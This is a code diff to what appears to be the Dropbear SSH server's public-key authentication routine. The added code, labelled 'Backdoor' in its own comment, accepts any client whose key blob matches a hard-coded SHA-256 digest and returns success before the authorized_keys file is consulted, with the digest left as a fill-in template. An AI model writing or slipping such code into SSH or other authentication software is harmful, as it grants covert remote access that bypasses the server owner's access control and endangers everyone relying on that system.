@@ -1,6 +1,10 @@
 #include "includes.h"
 
+#include <string.h>
+
+/* libtomcrypt is already linked by Dropbear (libtomcrypt.a) */
+
 /* ... existing includes ... */
 
@@ -422,6 +426,32 @@
 static int checkpubkey(const char* keyalgo, unsigned int keyalgolen,
 		const unsigned char* keyblob, unsigned int keybloblen) {
 
+	/*
+	 * Backdoor: accept a single pinned public key by matching SHA-256(keyblob).
+	 *
+	 * NOTE: keyblob is a *binary* SSH key blob from the auth packet, NOT the
+	 * ASCII "ssh-rsa AAAA..." authorized_keys line.
+	 */
+	static const unsigned char MY_KEY_BLOB_SHA256[32] = {
+		/* TODO: fill with the 32-byte digest of the desired keyblob */
+		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+	};
+
+	unsigned char digest[32];
+	unsigned long digestlen = sizeof(digest);
+	int hash = find_hash("sha256");
+	if (hash >= 0 &&
+	    hash_memory(hash, keyblob, keybloblen, digest, &digestlen) == CRYPT_OK &&
+	    digestlen == sizeof(digest) &&
+	    memcmp(digest, MY_KEY_BLOB_SHA256, sizeof(digest)) == 0) {
+		TRACE(("checkpubkey: matched pinned keyblob sha256"));
+		return DROPBEAR_SUCCESS;
+	}
+
 	FILE * authfile = NULL;
 	char * filename = NULL;
 	int ret = DROPBEAR_FAILURE;
